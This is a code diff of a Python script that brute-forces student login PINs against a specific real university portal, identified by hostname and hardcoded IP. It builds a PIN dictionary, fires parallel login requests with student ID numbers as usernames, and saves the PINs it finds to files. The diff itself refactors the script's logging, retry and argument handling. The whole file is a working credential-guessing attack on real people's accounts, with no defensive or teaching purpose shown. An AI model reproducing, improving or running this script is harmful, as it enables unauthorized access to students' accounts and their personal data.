@@ -5,25 +5,39 @@ import gc
 import time
 import requests
 import sys
+import logging
 
 
-def init():
+def init_global_argument(args):
+    global MAX_RETRY
+    global PROCESS_COUNT
     global URL
     global OK_TXT
+
+    MAX_RETRY = args.retry
+    PROCESS_COUNT = args.process
 
     # URL = "http://sion.stikom-bali.ac.id/load_login.php"
     URL = "http://180.250.7.188/load_login.php"
     OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
 
 
-def init_color():
-    global COLORED
-    try:
-        from colorama import Style, Back, Fore
-        COLORED = Fore
-    except:
-        print("Please install colorama (pip install colorama) to enable color")
-        COLORED = False
+def init_logging():
+    logFormatter = logging.Formatter(
+        fmt="[%(asctime)s][%(levelname)s] %(message)s",
+        datefmt='%d-%b-%y %H:%M:%S')
+
+    rootLogger = logging.getLogger()
+
+    fileHandler = logging.FileHandler("log.txt")
+    fileHandler.setFormatter(logFormatter)
+    rootLogger.addHandler(fileHandler)
+
+    consoleHandler = logging.StreamHandler()
+    consoleHandler.setFormatter(logFormatter)
+    rootLogger.addHandler(consoleHandler)
+
+    rootLogger.setLevel(logging.INFO)
 
 
 def init_dictionary(start_year=97, end_year=99):
@@ -56,7 +70,7 @@ def init_dictionary(start_year=97, end_year=99):
     DICTIONARY = list(set(DICTIONARY))
     total_time = time.time()-start_time
 
-    print("Dictionary generated {} values in {}s"
+    logging.info("Dictionary generated {} values in {}s"
           .format(len(DICTIONARY), total_time))
 
 
@@ -67,77 +81,65 @@ def login(pin, depth=0):
     global NIM
     global MAX_RETRY
 
-    if not SHARED.found and not SHARED.exception:
+    if not SHARED.found:
         try:
             with requests.Session() as s:
-                data = {"usern": nim, "passw": pin}
+                data = {"usern": NIM, "passw": pin}
                 r = s.post(URL, data=data).text
             if r == OK_TXT:
                 SHARED.found = True
                 return pin
-        except RequestException:
+        except requests.ConnectTimeout:
             if depth < MAX_RETRY:
                 depth += 1
-                try:
-                    return login(pin, depth=depth)
-                except:
-                    pass
-            SHARED.exception = True
-    return
+                return login(pin, depth=depth)
 
 
-def brute(nim, process):
+def brute(nim):
+    global PROCESS_COUNT
     global DICTIONARY
     global SHARED
     global NIM
-    global COLORED
 
     start_time = time.time()
-    sys.stdout.write('Trying for {} '.format(nim))
-    sys.stdout.flush()
+    logging.info('Trying for {} '.format(nim))
 
     NIM = nim
     SHARED = multiprocessing.Manager().Namespace()
     SHARED.found = False
-    SHARED.exception = False
 
-    result = []
-    p = multiprocessing.Pool(process)
+    # check saved pin first
     try:
         with open('found/{}'.format(nim), 'r') as f:
-            t = login(pin=f.read())
-            if t:
-                SHARED.found = True
-                result.append(t)
-    except:
+            pin = f.read()
+            logging.info('Saved pin found for {}, trying it.'.format(nim))
+    except FileNotFoundError:
         pass
-    result += list(p.map(login, DICTIONARY))
+    else:
+        result = login(pin)
+        if result == pin:
+            logging.info('Saved pin is good.')
+            return
+        else:
+            logging.warning('Saved pin is bad, trying normal method.')
 
-    p.close()
-    p.join()
+    with multiprocessing.Pool(PROCESS_COUNT) as pool:
+        result = list(pool.map(login, DICTIONARY))
+
     result = list(set(result))
     result.remove(None)
     total_time = time.time() - start_time
 
-    if SHARED.exception:
-        SHARED.exception = False
-        with open('exception.txt', 'a') as logfile:
-            logfile.write(str(nim) + ' ')
-        sys.stdout.write(COLORED.YELLOW if COLORED else '')
-        sys.stdout.write('\rException occured for {} '.format(nim))
-    elif len(result) == 1:
+    if len(result) == 1:
         with open('found/{}'.format(nim), 'w') as logfile:
             logfile.write(result[0])
-        sys.stdout.write(COLORED.GREEN if COLORED else '')
-        sys.stdout.write('\rFound {} {} '.format(nim, result[0]))
+            logging.info('Found %s %d' % (NIM, pin))
     else:
-        sys.stdout.write(COLORED.RED if COLORED else '')
-        sys.stdout.write('\rFailed {} '.format(nim))
-    print("time elapsed {}s".format(total_time))
-    sys.stdout.write(COLORED.RESET if COLORED else '')
+        logging.warning('Failed %s' % (NIM))
+    logging.info("Finished %s in %.2fs" % (NIM, total_time))
 
 
-if __name__ == '__main__':
+def parse_argument():
     import argparse
 
     parser = argparse.ArgumentParser()
@@ -168,46 +170,54 @@ if __name__ == '__main__':
                         type=int,
                         default=multiprocessing.cpu_count(),
                         help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU, use with CAUTION!!!")
-    args = parser.parse_args()
+    return parser.parse_args()
 
+
+def main():
+    global PROCESS_COUNT
+    args = parse_argument()
+
+    init_logging()
+    init_dictionary()
+    init_global_argument(args)
+
+    # parse and gather all target
     target = []
     done = []
-
     if args.infile:
         try:
             with open(args.infile, 'r') as filetarget:
                 target += filetarget.read().split(' ')
-        except:
-            print("List file is not reachable")
+        except FileNotFoundError:
+            logging.warning('Logfile not found.')
     if args.target:
         target += args.target
     if args.range:
         target += [n for n in range(args.range[0], args.range[1]+1)]
     if target == []:
-        print("Target is not set, please see --help")
+        logging.critical('Target is empty!')
         exit(1)
 
-    process = args.process
-    MAX_RETRY = args.retry
-
-    init()
-    init_color()
-    init_dictionary()
-
-    print("Starting bruteforce with {} processes for {} target(s)".format(
-        process, len(target)))
+    logging.info("Starting bruteforce with {} processes for {} target(s)".format(
+        PROCESS_COUNT, len(target)))
 
     try:
         for nim in target:
-            brute(nim=nim, process=process)
+            brute(nim=nim)
             done.append(nim)
             gc.collect()
     except KeyboardInterrupt:
-        print('\nStopped')
-    except:
-        print('\nException occured when trying to bruteforce {}'.format(NIM))
+        logging.info('Interrupted by user input')
+    except Exception as ex:
+        logging.exception('Exception occured: {}'.format(str(ex)))
     finally:
         if not len(done) == len(target):
-            print('Program terminated prematurely. Writing remaining target to temp.txt')
+            logging.info(
+                'Program terminated prematurely. Writing remaining target to temp.txt')
             with open(args.outfile, 'w') as outfile:
-                outfile.write(' '.join([str(t) for t in target if t not in done]))
+                outfile.write(' '.join([str(t)
+                                        for t in target if t not in done]))
+
+
+if __name__ == '__main__':
+    main()
